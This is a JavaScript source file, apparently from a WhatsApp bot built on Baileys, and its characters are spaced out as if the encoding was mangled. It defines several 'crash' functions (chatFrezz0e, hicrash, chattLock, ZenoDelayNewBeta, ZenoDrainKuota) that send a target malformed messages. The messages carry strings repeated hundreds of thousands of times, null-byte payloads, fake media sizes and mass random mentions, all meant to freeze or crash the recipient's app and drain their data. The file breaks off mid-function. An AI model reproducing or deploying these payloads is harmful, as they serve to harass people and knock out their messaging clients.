                 a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   m s g 1 . m e s s a g e ,   {   m e s s a g e I d :   m s g 1 . k e y . i d   } ) ; 
 
                 c o n s t   p a y m e n t P a y l o a d   =   { 
                         r e q u e s t P a y m e n t M e s s a g e :   { 
                                 c u r r e n c y C o d e I s o 4 2 1 7 :   ' U S D ' , 
                                 r e q u e s t F r o m :   t a r g e t , 
                                 e x p i r y T i m e s t a m p :   n u l l , 
                                 c o n t e x t I n f o :   { 
                                         r e m o t e J i d :   "   S   " , 
                                         i s F o r w a r d e d :   t r u e , 
                                         f o r w a r d i n g S c o r e :   9 7 9 , 
                                         e x t e r n a l A d R e p l y :   { 
                                                 t i t l e :   "   ⁖ T e l e g r a m @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � �   s y s t e m   � � " , 
                                                 b o d y :   " T e l e g r a m @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � �   � � " , 
                                                 m e d i a T y p e :   " V I D E O " , 
                                                 r e n d e r L a r g e r T h u m b n a i l :   t r u e , 
                                                 p r e v i e w T y p e :   " V I D E O " , 
                                                 s o u r c e U r l :   " V I P _ 1 X B " , 
                                                 m e d i a U r l :   " V I P _ 1 X B " , 
                                                 s h o w A d A t t r i b u t i o n :   t r u e , 
                                         } 
                                 } 
                         } 
                 } ; 
 
                 a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   p a y m e n t P a y l o a d ,   { 
                         p a r t i c i p a n t :   {   j i d :   t a r g e t   } , 
                         q u o t e d :   n u l l , 
                         u s e r J i d :   n u l l , 
                         m e s s a g e I d :   n u l l 
                 } ) ; 
                 
         }   c a t c h   ( e r r )   { 
                 c o n s o l e . e r r o r ( " E r r o r " ,   e r r ) ; 
         } 
 }     
         
         
         
         a s y n c   f u n c t i o n   c h a t F r e z z 0 e ( t a r g e t )   { 
         t r y   { 
                 f o r   ( l e t   s   =   0 ;   s   <   1 ;   s + + )   { 
                         c o n s t   s t i c k e r M e s s a g e   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( 
                                 t a r g e t , 
                                 p r o t o . M e s s a g e . f r o m O b j e c t ( { 
                                         b o t I n v o k e M e s s a g e :   { 
                                                 m e s s a g e :   { 
                                                         m e s s a g e C o n t e x t I n f o :   { 
                                                                 m e s s a g e S e c r e t :   c r y p t o . r a n d o m B y t e s ( 3 2 ) , 
                                                                 d e v i c e L i s t M e t a d a t a :   { 
                                                                         s e n d e r K e y I n d e x :   0 , 
                                                                         s e n d e r T i m e s t a m p :   D a t e . n o w ( ) , 
                                                                         r e c i p i e n t K e y I n d e x :   0 
                                                                 } 
                                                         } , 
                                                         s t i c k e r P a c k M e s s a g e :   { 
                                                                 s t i c k e r P a c k I d :   " 1 e 6 6 1 0 2 f - 2 c 7 c - 4 b b 9 - 8 0 c f - 8 1 1 e 9 2 2 b d 1 a 8 " , 
                                                                 n a m e :   " X i n v a s i o n X "   +   " � � � � � � � � " . r e p e a t ( 5 0 0 0 0 ) , 
                                                                 p u b l i s h e r :   " t . m e / j o h n l e o s m 1 t h " , 
                                                                 s t i c k e r s :   [ 
                                                                         { 
                                                                                 f i l e N a m e :   " a Z x - 5 5 h z R - Q p F J E 0 C L a z i i 3 x v H 1 j w A E 5 o w B J 9 Q + 1 w e g = . w e b p " , 
                                                                                 i s A n i m a t e d :   f a l s e , 
                                                                                 e m o j i s :   [ " " ] , 
                                                                                 a c c e s s i b i l i t y L a b e l :   " " , 
                                                                                 i s L o t t i e :   f a l s e , 
                                                                                 m i m e t y p e :   " i m a g e / w e b p " 
                                                                         } , 
                                                                         { 
                                                                                 f i l e N a m e :   " d F 9 x m R e 4 1 4 r A W S r B R a Y e r 7 w a h o v M E w l P R V J F z V D U G I w = . w e b p " , 
                                                                                 i s A n i m a t e d :   f a l s e , 
                                                                                 e m o j i s :   [ " " ] , 
                                                                                 a c c e s s i b i l i t y L a b e l :   " " , 
                                                                                 i s L o t t i e :   f a l s e , 
                                                                                 m i m e t y p e :   " i m a g e / w e b p " 
                                                                         } , 
                                                                         { 
                                                                                 f i l e N a m e :   " k m g U 3 6 C K o f P + d X w w 1 B 7 T V v T t Q L K 9 C E u W b P Y d 9 A B R t A w = . w e b p " , 
                                                                                 i s A n i m a t e d :   f a l s e , 
                                                                                 e m o j i s :   [ " " ] , 
                                                                                 a c c e s s i b i l i t y L a b e l :   " " , 
                                                                                 i s L o t t i e :   f a l s e , 
                                                                                 m i m e t y p e :   " i m a g e / w e b p " 
                                                                         } , 
                                                                         { 
                                                                                 f i l e N a m e :   " X Z z 6 g F 1 l X c y G R j z 1 k 6 n r v 2 x W 8 y 2 L 9 M o f M p s m l F Z I M g Y = . w e b p " , 
                                                                                 i s A n i m a t e d :   f a l s e , 
                                                                                 e m o j i s :   [ " " ] , 
                                                                                 a c c e s s i b i l i t y L a b e l :   " " , 
                                                                                 i s L o t t i e :   f a l s e , 
                                                                                 m i m e t y p e :   " i m a g e / w e b p " 
                                                                         } , 
                                                                         { 
                                                                                 f i l e N a m e :   " i Y j I g E p 2 J / 4 b F 2 j D J i E T h z U 5 u N V d 3 A r B 4 e X m m r 8 J G 5 M = . w e b p " , 
                                                                                 i s A n i m a t e d :   f a l s e , 
                                                                                 e m o j i s :   [ " " ] , 
                                                                                 a c c e s s i b i l i t y L a b e l :   " " , 
                                                                                 i s L o t t i e :   f a l s e , 
                                                                                 m i m e t y p e :   " i m a g e / w e b p " 
                                                                         } , 
                                                                         { 
                                                                                 f i l e N a m e :   " w L f O d Z J 3 / j E 8 E d S + r Q D N p j M n 9 i + j r s C P c 3 D n f r p b E a o = . w e b p " , 
                                                                                 i s A n i m a t e d :   f a l s e , 
                                                                                 e m o j i s :   [ " " ] , 
                                                                                 a c c e s s i b i l i t y L a b e l :   " " , 
                                                                                 i s L o t t i e :   f a l s e , 
                                                                                 m i m e t y p e :   " i m a g e / w e b p " 
                                                                         } , 
                                                                         { 
                                                                                 f i l e N a m e :   " B 4 a U T Y O 1 x H j 2 V w C e N g F k c h q t D 5 l Z / 5 9 o m L b 5 b i 5 N v O w = . w e b p " , 
                                                                                 i s A n i m a t e d :   f a l s e , 
                                                                                 e m o j i s :   [ " " ] , 
                                                                                 a c c e s s i b i l i t y L a b e l :   " " , 
                                                                                 i s L o t t i e :   f a l s e , 
                                                                                 m i m e t y p e :   " i m a g e / w e b p " 
                                                                         } , 
                                                                         { 
                                                                                 f i l e N a m e :   " l s S 7 u O 7 I q Z J 8 P Q S o D Y D z x 0 Z C y F + e 6 h T M E o b k t 1 f 8 e A 0 = . w e b p " , 
                                                                                 i s A n i m a t e d :   f a l s e , 
                                                                                 e m o j i s :   [ " " ] , 
                                                                                 a c c e s s i b i l i t y L a b e l :   " " , 
                                                                                 i s L o t t i e :   f a l s e , 
                                                                                 m i m e t y p e :   " i m a g e / w e b p " 
                                                                         } , 
                                                                         { 
                                                                                 f i l e N a m e :   " A 2 P v E W o 9 t B Z u p S 1 V 1 Y X K J 5 i w f S R d r w l m c e N d y 4 U k s R 8 = . w e b p " , 
                                                                                 i s A n i m a t e d :   f a l s e , 
                                                                                 e m o j i s :   [ " " ] , 
                                                                                 a c c e s s i b i l i t y L a b e l :   " " , 
                                                                                 i s L o t t i e :   f a l s e , 
                                                                                 m i m e t y p e :   " i m a g e / w e b p " 
                                                                         } , 
                                                                         { 
                                                                                 f i l e N a m e :   " H D V 3 j x / h S V 5 O J + b L x 3 6 + d n Z + B r 4 M k r 8 X 5 K q R L 0 a I 2 X o = . w e b p " , 
                                                                                 i s A n i m a t e d :   f a l s e , 
                                                                                 e m o j i s :   [ " " ] , 
                                                                                 a c c e s s i b i l i t y L a b e l :   " " , 
                                                                                 i s L o t t i e :   f a l s e , 
                                                                                 m i m e t y p e :   " i m a g e / w e b p " 
                                                                         } 
                                                                 ] , 
                                                                 f i l e L e n g t h :   " 8 0 2 0 9 3 5 " , 
                                                                 f i l e S h a 2 5 6 :   " 7 7 o J b l 0 e W Z 4 b i 8 z 0 R Z x L s Z J 1 t u + f / Z E r c Y E 8 S j 2 K 1 + U = " , 
                                                                 f i l e E n c S h a 2 5 6 :   " 2 K w i x O J t p l 4 i v q 8 H M g T Q G I C W + H M x L n Z u Q m U N 6 K P D 4 k g = " , 
                                                                 m e d i a K e y :   " i 4 I 6 3 2 5 n s u H e Y h j 4 K u y e Z + 8 b H A x E 6 A 5 R t 5 u z y N R I a T k = " , 
                                                                 d i r e c t P a t h :   " / v / t 6 2 . 1 5 5 7 5 - 2 4 / 2 3 2 1 2 9 3 7 _ 5 6 4 0 0 1 0 7 0 1 0 0 7 0 0 _ 5 7 4 0 1 6 6 2 0 9 5 4 0 2 6 4 2 2 6 _ n . e n c " , 
                                                                 c o n t e x t I n f o :   {   
                                                                         m e n t i o n e d J i d :   [ 
                                                                                 " 0 @ s . w h a t s a p p . n e t " , 
                                                                                 . . . A r r a y . f r o m ( {   l e n g t h :   5 0   } ,   ( )   = > 
                                                                                         ` 1 $ { M a t h . f l o o r ( M a t h . r a n d o m ( )   *   5 0 0 0 0 0 0 ) } @ s . w h a t s a p p . n e t ` 
                                                                                 ) 
                                                                         ] 
                                                                 } , 
                                                                 p a c k D e s c r i p t i o n :   " " , 
                                                                 m e d i a K e y T i m e s t a m p :   " 1 7 4 9 5 0 6 4 4 0 " , 
                                                                 t r a y I c o n F i l e N a m e :   " 1 e 6 6 1 0 2 f - 2 c 7 c - 4 b b 9 - 8 0 c f - 8 1 1 e 9 2 2 b d 1 a 8 . p n g " , 
                                                                 t h u m b n a i l H e i g h t :   2 5 2 , 
                                                                 t h u m b n a i l W i d t h :   2 5 2 , 
                                                                 s t i c k e r P a c k S i z e :   " 1 5 0 0 0 0 0 0 0 0 0 " , 
                                                                 s t i c k e r P a c k O r i g i n :   " U S E R _ C R E A T E D " 
                                                         } 
                                                 } 
                                         } 
                                 } ) , 
                                 {   u s e r J i d :   t a r g e t   } 
                         ) ; 
 
                         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   s t i c k e r M e s s a g e . m e s s a g e ,   {   
                                 m e s s a g e I d :   s t i c k e r M e s s a g e . k e y . i d , 
                                 p a r t i c i p a n t :   {   j i d :   t a r g e t   } 
                         } ) ; 
                         a w a i t   s l e e p ( 1 0 0 ) ; 
                 } 
         }   c a t c h   ( e )   { 
                 c o n s o l e . e r r o r ( e ) ; 
         } 
 } 
         
         
         a s y n c   f u n c t i o n   h i c r a s h ( t a r g e t )   { 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
                 b o t F o r w a r d e d M e s s a g e :   { 
                         m e s s a g e :   { 
                                 i n t e r a c t i v e R e s p o n s e M e s s a g e :   { 
                                         b o d y :   { 
                                                 t e x t :   " ا ل س ل ا م   ع ل ي ك م " , 
                                                 f o r m a t :   " D E F A U L T " 
                                         } , 
                                         n a t i v e F l o w R e s p o n s e M e s s a g e :   { 
                                                 p a r a m s J s o n :   " \ u 0 0 0 0 " . r e p e a t ( 1 0 0 0 0 0 0 ) , 
                                                 v e r s i o n :   3 
                                         } 
                                 } 
                         } 
                 } 
         } ,   { } ) ; 
 } 
         
         
         
         
       a s y n c   f u n c t i o n   c h a t t L o c k ( t a r g e t )   { 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
         v i d e o M e s s a g e :   { 
             u r l :   " h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 7 1 6 1 - 2 4 / 5 9 8 1 5 8 6 4 2 _ 8 6 4 3 9 1 8 9 6 0 8 4 4 2 6 _ 4 6 3 0 9 9 7 9 5 2 6 8 1 5 9 1 2 9 7 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a 3 Q H l N T S p R K X x o G o 5 J - b 6 - g w 7 M 1 p v l G u v o i 6 y p 2 p J O j F 0 e w & o e = 6 9 5 F 3 2 D 4 & _ n c _ s i d = 5 e 0 3 e 0 & m m s 3 = t r u e " , 
             m i m e t y p e :   " v i d e o / m p 4 " , 
             f i l e S h a 2 5 6 :   " f Y 6 Q R Z g i 0 B M a R I Z R Q d t W D K g 5 t X F T + K P G c q p k e f k q v G I = " , 
             f i l e L e n g t h :   9 9 9 9 9 9 9 9 9 , 
             s e c o n d s :   7 2 0 5 0 8 2 9 , 
             m e d i a K e y :   " X p j 7 T b 8 U P X D j / R q e D S 4 Q H J B J t y C t X a s m P 2 0 4 / v 6 p X Y 4 = " , 
             h e i g h t :   9 9 9 9 , 
             w i d t h :   9 9 9 9 , 
             f i l e E n c S h a 2 5 6 :   " d U k j p / 6 O m U d R s A R e c s H R P H o / T d Q 9 H f w a J h Y r s e E 0 7 U 8 = " , 
             d i r e c t P a t h :   " / v / t 6 2 . 7 1 6 1 - 2 4 / 5 9 8 1 5 8 6 4 2 _ 8 6 4 3 9 1 8 9 6 0 8 4 4 2 6 _ 4 6 3 0 9 9 7 9 5 2 6 8 1 5 9 1 2 9 7 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a 3 Q H l N T S p R K X x o G o 5 J - b 6 - g w 7 M 1 p v l G u v o i 6 y p 2 p J O j F 0 e w & o e = 6 9 5 F 3 2 D 4 & _ n c _ s i d = 5 e 0 3 e 0 " , 
             m e d i a K e y T i m e s t a m p :   1 7 6 5 2 6 0 3 8 7 , 
             c a p t i o n :   " � � ‍ � � ⃟ ꙰ 。 ⌁   � � � � � �   ͡ � � � � � �   ͜ ⃰ � � .   -   � � � � � � � � � � � � � �       ⃟ ꙰ � � ‍ � � " ,   
             c o n t e x t I n f o :   { 
                 p a i r e d M e d i a T y p e :   " N O T _ P A I R E D _ M E D I A " , 
                 s t a t u s S o u r c e T y p e :   " M U S I C _ S T A N D A L O N E " , 
                 s t a t u s A t t r i b u t i o n s :   [ 
                     { 
                         t y p e :   " S T A T U S _ M E N T I O N " , 
                         m u s i c :   { 
                             a u t h o r N a m e :   " " , 
                             s o n g I d :   " 1 1 3 7 8 1 2 6 5 6 6 2 3 9 0 8 " , 
                             t i t l e :   " � � � � ‍ � � ꙰ ⃟ " . r e p e a t ( 1 0 0 0 0 ) , 
                             a u t h o r :   " � � � � ‍ � � ꙰ ⃟ " . r e p e a t ( 1 0 0 0 0 ) , 
                             a r t i s t A t t r i b u t i o n :   " h t t p s : / / t . m e / + F p 9 f 7 O L i g K g w Z W U 0 " , 
                             i s E x p l i c i t :   t r u e 
                         } 
                     } 
                 ] 
             } , 
             s t r e a m i n g S i d e c a r :   " i f z q b b i 6 V Q r r 2 q W U V c i b C L L D 5 M u b l G I U I 7 V Q W l l r t S H 0 O y 9 O o m 8 F s w = = " , 
             t h u m b n a i l D i r e c t P a t h :   " / v / t 6 2 . 3 6 1 4 7 - 2 4 / 5 9 7 9 3 1 0 2 0 _ 1 1 1 4 1 3 6 3 0 0 6 1 9 2 3 8 _ 2 1 3 2 2 6 7 8 8 2 4 7 7 7 6 2 5 2 6 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a 3 Q E 3 W w u j M W l Y X t H m 0 O s W v W U 7 G 2 i N P A N w 9 C p t 6 4 a O c O v N r g & o e = 6 9 5 F 1 4 B 4 & _ n c _ s i d = 5 e 0 3 e 0 " , 
             t h u m b n a i l S h a 2 5 6 :   " e w O l F H M a Q j W V M 2 M I H g d L E S H C 9 l T e 8 w q H o R l 5 S t i L k h M = " , 
             t h u m b n a i l E n c S h a 2 5 6 :   " V f 7 t q U V / U 7 c F 0 6 4 u 4 m V f 9 / b 7 8 u d + D s 3 O S 2 A U w P O s 5 x E = " , 
             a n n o t a t i o n s :   [ 
                 { 
                     p o l y g o n V e r t i c e s :   [ 
                         { 
                             x :   0 . 0 4 8 0 8 3 3 3 1 4 3 5 9 1 8 8 1 , 
                             y :   0 . 3 7 5 8 8 2 8 0 4 3 9 3 7 6 8 3 
                         } , 
                         { 
                             x :   0 . 9 3 9 7 7 7 7 9 1 5 0 0 0 9 1 6 , 
                             y :   0 . 3 7 5 8 8 2 8 0 4 3 9 3 7 6 8 3 
                         } , 
                         { 
                             x :   0 . 9 3 9 7 7 7 7 9 1 5 0 0 0 9 1 6 , 
                             y :   0 . 6 2 4 1 0 9 3 8 7 3 9 7 7 6 6 1 
                         } , 
                         { 
                             x :   0 . 0 4 8 0 8 3 3 3 1 4 3 5 9 1 8 8 1 , 
                             y :   0 . 6 2 4 1 0 9 3 8 7 3 9 7 7 6 6 1 
                         } 
                     ] , 
                     s h o u l d S k i p C o n f i r m a t i o n :   t r u e , 
                     e m b e d d e d C o n t e n t :   { 
                         e m b e d d e d M e s s a g e :   { 
                             s t a n z a I d :   " A C 2 F A 3 3 9 1 8 3 6 A 5 F 4 3 1 C 9 0 4 8 A 1 1 4 6 D 3 B 5 " , 
                             m e s s a g e :   { 
                                 e x t e n d e d T e x t M e s s a g e :   { 
                                     t e x t :   " 7 e p p e l i . p d f " , 
                                     p r e v i e w T y p e :   " N O N E " , 
                                     i n v i t e L i n k G r o u p T y p e V 2 :   " D E F A U L T " 
                                 } , 
                                 m e s s a g e C o n t e x t I n f o :   { 
                                     m e s s a g e S e c r e t :   " / M 7 r q u U f S 6 C E S B 4 4 p G 4 g k I E n J X m W C j 0 T W p l G d 5 a n Y p I = " , 
                                     m e s s a g e A s s o c i a t i o n :   { 
                                         a s s o c i a t i o n T y p e :   1 6 , 
                                         p a r e n t M e s s a g e K e y :   { 
                                             r e m o t e J i d :   t a r g e t , 
                                             f r o m M e :   f a l s e , 
                                             i d :   " A C 9 1 1 E F E D A 4 2 D E A 4 5 8 6 C 4 B B 8 C 2 8 1 4 5 6 3 " , 
                                             p a r t i c i p a n t :   X e o n B o t I n c . u s e r . i d 
                                         } 
                                     } 
                                 } 
                             } 
                         } 
                     } , 
                     e m b e d d e d A c t i o n :   t r u e 
                 } , 
                 { 
                     p o l y g o n V e r t i c e s :   [ 
                         { 
                             x :   0 . 2 7 7 9 6 0 4 1 9 6 5 4 8 4 6 2 , 
                             y :   0 . 3 6 9 7 6 5 2 2 2 0 7 2 6 0 1 3 
                         } , 
                         { 
                             x :   0 . 6 9 9 3 7 7 2 9 8 3 5 5 1 0 2 5 , 
                             y :   0 . 4 3 2 5 7 2 7 8 2 0 3 9 6 4 2 3 3 
                         } , 
                         { 
                             x :   0 . 6 0 1 5 5 3 4 9 9 6 9 8 6 3 8 9 , 
                             y :   0 . 6 4 0 2 5 0 3 8 4 8 0 7 5 8 6 7 
                         } , 
                         { 
                             x :   0 . 1 8 0 1 3 6 5 7 6 2 9 4 8 9 9 , 
                             y :   0 . 5 7 7 4 4 2 7 6 5 2 3 5 9 0 0 9 
                         } 
                     ] , 
                     s h o u l d S k i p C o n f i r m a t i o n :   t r u e , 
                     e m b e d d e d C o n t e n t :   { 
                         e m b e d d e d M u s i c :   { 
                             m u s i c C o n t e n t M e d i a I d :   " 1 9 0 6 8 1 3 6 7 4 0 4 7 2 5 3 " , 
                             s o n g I d :   " 1 1 3 7 8 1 2 6 5 6 6 2 3 9 0 8 " , 
                             a u t h o r :   " � � � � ‍ � � ꙰ ⃟ " . r e p e a t ( 1 0 0 0 0 ) , 
                             t i t l e :   " � � � � ‍ � � ꙰ ⃟ " . r e p e a t ( 1 0 0 0 0 ) , 
                             a r t w o r k D i r e c t P a t h :   " / v / t 6 2 . 7 6 4 5 8 - 2 4 / 5 9 8 3 9 1 1 0 3 _ 3 2 7 3 0 0 9 9 8 0 2 1 3 1 8 4 _ 2 7 5 9 3 2 6 2 0 2 3 9 9 6 5 5 8 6 5 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a 3 Q G n x - U J j j Z j g A c B W A O 2 Z _ f j A V S k r 6 _ 6 T r x 2 f P X 0 b U W q _ Q & o e = 6 9 5 F 1 9 4 E & _ n c _ s i d = 5 e 0 3 e 0 " , 
                             a r t w o r k S h a 2 5 6 :   " r 9 B W A O U f r D C n p 3 b n + / b z O x 1 A 9 6 6 Z 3 C S p n e m r 2 4 F t a V 0 = " , 
                             a r t w o r k E n c S h a 2 5 6 :   " R x k Y i V 5 Y B T T k o d l B T 2 0 q V H a z b r B i p H B C L b 5 t 9 B W u a X o = " , 
                             a r t i s t A t t r i b u t i o n :   " h t t p s : / / t . m e / + F p 9 f 7 O L i g K g w Z W U 0 " , 
                             c o u n t r y B l o c k l i s t :   " U l U = " , 
                             i s E x p l i c i t :   t r u e , 
                             a r t w o r k M e d i a K e y :   " G u N I n n t c R n y N i Y c Z 2 8 Y m 4 g 8 O e Z z 7 J b N B H l 6 t P O L 5 B B A = " 
                         } 
                     } , 
                     e m b e d d e d A c t i o n :   t r u e 
                 } 
             ] 
         } 
     } ,   {   
         p a r t i c i p a n t :   {   j i d : t a r g e t   } 
     } ) 
 } 
         a s y n c   f u n c t i o n   Z e n o D e l a y N e w B e t a ( t a r g e t ,   p t c p   =   t r u e )   { 
     c o n s t   V a r i a b e l J i d   =   " 0 @ s . w h a t s a p p . n e t " ; 
     c o n s t   i m a g e M s g   =   { 
         u r l :   " h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 7 1 1 8 - 2 4 / 5 3 3 4 5 7 7 4 1 _ 1 9 1 5 8 3 3 9 8 2 5 8 3 5 5 5 _ 6 4 1 4 3 8 5 7 8 7 2 6 1 7 6 9 7 7 8 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a 2 Q H l K H v P N 0 l h O h S E X 9 _ Z q x b t i G e i t s i _ y M o s B c j p p F i o k Q & o e = 6 8 C 6 9 9 8 8 & _ n c _ s i d = 5 e 0 3 e 0 & m m s 3 = t r u e " , 
         m i m e t y p e :   " i m a g e / j p e g " , 
         f i l e S h a 2 5 6 :   " Q p v b D u 5 H k m e G R O D H F e L P 7 V P j + P y K a s / Y T i P N r M v N P h 4 = " , 
         f i l e L e n g t h :   " 9 9 9 9 9 9 9 9 " , 
         h e i g h t :   9 9 9 9 , 
         w i d t h :   9 9 9 9 , 
         m e d i a K e y :   " e x R i y o j i r m q M k 2 1 e + x H 1 S L l f Z z E T n z K U H 6 G w x A A Y u / 8 = " , 
         f i l e E n c S h a 2 5 6 :   " D 0 L X I M W Z 0 q D / N m W x P M l 9 t p h A l z d p V G / A 3 J x M H v E s y S k = " , 
         d i r e c t P a t h :   " / v / t 6 2 . 7 1 1 8 - 2 4 / 5 3 3 4 5 7 7 4 1 _ 1 9 1 5 8 3 3 9 8 2 5 8 3 5 5 5 _ 6 4 1 4 3 8 5 7 8 7 2 6 1 7 6 9 7 7 8 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a 2 Q H l K H v P N 0 l h O h S E X 9 _ Z q x b t i G e i t s i _ y M o s B c j p p F i o k Q & o e = 6 8 C 6 9 9 8 8 & _ n c _ s i d = 5 e 0 3 e 0 " , 
         m e d i a K e y T i m e s t a m p :   " 1 7 5 5 2 5 4 3 6 7 " , 
         j p e g T h u m b n a i l :   " / 9 j / 4 A A Q S k Z J R g A B A Q A A A Q A B A A D / 2 w C E A B s b G x s c G x 4 h I R 4 q L S g t K j 0 4 M z M 4 P V 1 C R 0 J H Q l 2 N W G d Y W G d Y j X 2 X e 3 N 7 l 3 3 g s J y c s O D / 2 c 7 Z / / / / / / / / / / / / / / 8 B G x s b G x w b H i E h H i o t K C 0 q P T g z M z g 9 X U J H Q k d C X Y 1 Y Z 1 h Y Z 1 i N f Z d 7 c 3 u X f e C w n J y y 4 P / Z z t n / / / / / / / / / / / / / / / / C A B E I A E g A S A M B I g A C E Q E D E Q H / x A A u A A E B A Q E B A Q A A A A A A A A A A A A A A A Q I D B A Y B A Q E B A Q A A A A A A A A A A A A A A A A E A A g P / 2 g A M A w E A A h A D E A A A A P n Z T m b z u o x 0 T m B C t S q Z 3 y n c Z N b a m u c U M s z S B o W t X B z o U x Z N O 2 e n F 6 M m + M s 1 x o S a K m j O w n I c Q J / / x A A h E A A C A Q Q C A g M A A A A A A A A A A A A B E Q A C E B I g E T H E R Q S J A Y f / a A A g B A Q A B P w C 6 x D l P J l V P v Y T y e o K l G x s I a v k 4 F 3 H z s l 3 Y J W W j Q h O g K j d y f p i Y U z C k m C g F / k O v U z M z M z O n / 8 Q A G h E B A A I D A Q A A A A A A A A A A A A A A A R E g A B A S M P / a A A g B A g E B P w C z 5 L G d F Y N / / 8 Q A H B E A A g I C A w A A A A A A A A A A A A A A A R E g A B A S M P / a A A g B A w E B P w C z 5 L G d F Y N / / 9 k = " , 
         c a p t i o n :   " \ u 0 0 0 0 " . r e p e a t ( 1 0 4 5 0 0 ) , 
     } ; 
 
     l e t   m s g   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
         v i e w O n c e M e s s a g e :   { 
             m e s s a g e :   { 
                 a l b u m M e s s a g e :   { 
                     e x p e c t e d I m a g e C o u n t :   6 6 6 , 
                     e x p e c t e d V i d e o C o u n t :   0 , 
                     i t e m s :   [ 
                         {   
                             i m a g e M e s s a g e :   i m a g e M s g   
                         } 
                     ] , 
                     c o n t e x t I n f o :   { 
                         m e n t i o n e d J i d :   [ 
                             " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " , 
                             . . . A r r a y . f r o m ( {   l e n g t h :   1 9 0 0   } ,   
                             ( )   = >   ` 1 $ { M a t h . f l o o r ( M a t h . r a n d o m ( )   *   5 0 0 0 0 0 ) } @ s . w h a t s a p p . n e t ` 
                             ) 
                         ] , 
                         p a r t i c i p a n t :   " 0 @ s . w h a t s a p p . n e t " , 
                         r e m o t e J i d :   " s t a t u s @ b r o a d c a s t " , 
                         s t a n z a I d :   " 1 2 3 4 5 6 7 8 9 0 A B C D E F " , 
                         b u s i n e s s M e s s a g e F o r w a r d I n f o :   { 
                             b u s i n e s s O w n e r J i d :   V a r i a b e l J i d , 
                         } , 
                     } , 
                 } , 
             } , 
         } , 
     } ,   { } ) ; 
     
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
         g r o u p S t a t u s M e s s a g e V 2 :   { 
             m e s s a g e :   m s g . m e s s a g e , 
           } , 
         } ,   p t c p   ?   
         {   
             m e s s a g e I d :   m s g . k e y . i d ,   
             p a r t i c i p a n t :   {   j i d :   t a r g e t   }   
         }   :   {   m e s s a g e I d :   m s g . k e y . i d   } 
     ) ; 
     
     c o n s t   p a y l o a d   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
         v i e w O n c e M e s s a g e :   { 
             m e s s a g e :   { 
                 i n t e r a c t i v e R e s p o n s e M e s s a g e :   { 
                     b o d y :   {   
                         t e x t :   " � �   -   � �   � �   � �   � � " ,   
                         f o r m a t :   " D E F A U L T "   
                     } , 
                     n a t i v e F l o w R e s p o n s e M e s s a g e :   { 
                         n a m e :   " a d d r e s s _ m e s s a g e " , 
                         p a r a m s J s o n :   " \ x 1 0 " . r e p e a t ( 1 0 4 5 0 0 0 ) , 
                         v e r s i o n :   3 
                     } , 
                     e n t r y P o i n t C o n v e r s i o n S o u r c e :   " c a l l _ p e r m i s s i o n _ r e q u e s t " 
                     } , 
                 } , 
             } , 
         } , 
         { 
             e p h e m e r a l E x p i r a t i o n :   0 , 
             f o r w a r d i n g S c o r e :   9 7 4 1 , 
             i s F o r w a r d e d :   t r u e , 
             f o n t :   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   9 9 9 9 9 9 9 9 ) , 
             b a c k g r o u n d :   " # "   +   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   1 6 7 7 7 2 1 5 ) . t o S t r i n g ( 1 6 ) . p a d S t a r t ( 6 ,   " 9 9 9 9 9 9 9 9 " ) , 
         } , 
     ) ; 
     
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
         g r o u p S t a t u s M e s s a g e V 2 :   { 
             m e s s a g e :   p a y l o a d . m e s s a g e , 
           } , 
         } ,   p t c p   ?   
         {   
             m e s s a g e I d :   p a y l o a d . k e y . i d ,   
             p a r t i c i p a n t :   {   j i d :   t a r g e t   }   
         }   :   {   m e s s a g e I d :   p a y l o a d . k e y . i d   } 
     ) ; 
 } 
         
         a s y n c   f u n c t i o n   Z e n o D r a i n K u o t a ( t a r g e t ,   p t c p   =   t r u e )   { 
     c o n s t   V i d M e s s a g e   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
         v i d e o M e s s a g e :   { 
             u r l :   " h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 7 1 6 1 - 2 4 / 1 3 1 5 8 9 6 9 _ 5 9 9 1 6 9 8 7 9 9 5 0 1 6 8 _ 4 0 0 5 7 9 8 4 1 5 0 4 7 3 5 6 7 1 2 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a I X X q - P n u k 1 M C i e m _ V _ b r V e o m y l l n o 4 O 7 j i x i K s U d M z W y & o e = 6 8 1 8 8 C 2 9 & _ n c _ s i d = 5 e 0 3 e 0 & m m s 3 = t r u e " , 
             m i m e t y p e :   " v i d e o / m p 4 " , 
             f i l e S h a 2 5 6 :   " c 8 v 7 1 f h G C r f v u d S n H x E r I Q 7 0 A 2 O 6 N H h o + g F 7 v D C a 4 y g = " , 
             f i l e L e n g t h :   " 2 8 9 5 1 1 " , 
             s e c o n d s :   1 5 , 
             m e d i a K e y :   " I P r 7 T i y a C X w V q r o p 2 P Q r 8 I q 2 T 4 u 7 P u T 7 K C f 2 s Y B i T l o = " , 
             c a p t i o n :   " \ n " , 
             h e i g h t :   6 4 0 , 
